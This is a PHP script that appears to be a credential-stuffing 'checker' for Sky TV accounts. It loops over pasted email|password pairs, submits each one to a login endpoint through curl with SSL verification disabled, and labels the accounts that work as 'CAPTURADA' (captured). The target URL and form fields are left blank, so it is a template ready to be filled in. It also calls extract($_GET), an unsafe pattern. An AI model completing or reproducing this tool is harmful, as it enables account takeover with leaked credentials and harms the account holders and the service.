<?php

extract($_GET);
error_reporting(0);
if (file_exists(getcwd().('/cookie.txt'))) { 
    @unlink('cookie.txt'); 
}

function getStr($string,$start,$end){
	$str = explode($start,$string);
	$str = explode($end, $str[1]);
	return $str[0];
}	

{
	$separador = "|";
	$e = explode("\r\n", $lista);
	$c = count($e);
	for ($i=0; $i <$c; $i++) {
		$explode = explode($separador, $e[$i]);
		Testar(trim($explode[0]),trim($explode[1]));
	}
}
function Testar($email,$senha){
	if (file_exists(getcwd()."/cookies.txt")) {
		unlink(getcwd()."/cookies.txt");
	}

	//VARIAVEIS DE CONFIG

	$url = "";

	$userAgent = "";

	$postField = '';

	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
	curl_setopt($ch, CURLOPT_ENCODING, "gzip"); //QUEBRAR CRIPTOGRAFIA
	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd()."/cookie.txt");
	curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd()."/cookie.txt");
	curl_setopt($ch, CURLOPT_USERAGENT, $userAgent);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
	curl_setopt($ch, CURLOPT_HTTPHEADER, array(
			
				



				));
	;
	curl_setopt($ch, CURLOPT_POST, 1);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $postField);
	$resposta = curl_exec($ch);

	//echo $resposta;
	//$disco = GetStr($resposta, "'Total Disk Space Used',':'");

		if (strpos($resposta, '')) {

		echo "<font color='#FF0000'> 📺 CAPTURADA  📺 »</font> <font color='#000000'>Conta Sky: ".$email."  ".$senha." </font>¹₇ ¹<font color='red'>#</font><font color='#ffaa00'>R</font><font color='#aaff00'>4</font><font color='lime'>C</font><font color='#00ffaa'>E</font><font color='#00a9ff'>N</font><font color='blue'>T</font><font color='#aa00ff'>E</font><font color='#ff00aa'>R</font>¹₇ ¹<br />";
		flush();
		ob_flush();
	}else{
		echo "<font color='#01DF01'>📺 REPROVADA 📺 » </font> Conta Sky:  ".$email." | ".$senha." ".$nome." <font color='red'>#</font><font color='#ffaa00'>R</font><font color='#aaff00'>4</font><font color='lime'>C</font><font color='#00ffaa'>E</font><font color='#00a9ff'>N</font><font color='blue'>T</font><font color='#aa00ff'>E</font><font color='#ff00aa'>R</font><br /></font> ";
		flush();
		ob_flush();
	}
}
?>